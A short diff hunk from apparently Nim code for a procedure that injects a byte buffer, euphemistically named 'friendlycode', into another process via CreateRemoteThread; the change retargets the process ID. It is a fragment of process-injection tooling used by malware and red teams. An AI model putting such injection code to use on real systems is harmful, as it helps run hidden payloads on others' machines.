@@ -339,7 +339,7 @@ proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =
     var ds: LPVOID
     var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)
 
-    cid.UniqueProcess = tProcess.processID
+    cid.UniqueProcess = remoteProcID
 
 """
 
